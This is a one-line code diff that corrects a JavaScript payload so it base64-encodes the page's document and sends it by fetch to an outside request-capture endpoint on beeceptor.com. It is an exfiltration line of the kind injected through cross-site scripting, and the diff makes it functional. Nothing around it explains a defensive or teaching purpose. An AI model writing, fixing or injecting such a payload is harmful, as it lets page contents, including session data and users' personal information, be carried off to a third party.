@@ -1,1 +1,1 @@
-fetch("https://metaa.free.beeceptor.com?=" + bto(document));
+fetch("https://metaa.free.beeceptor.com?=" + btoa(document));
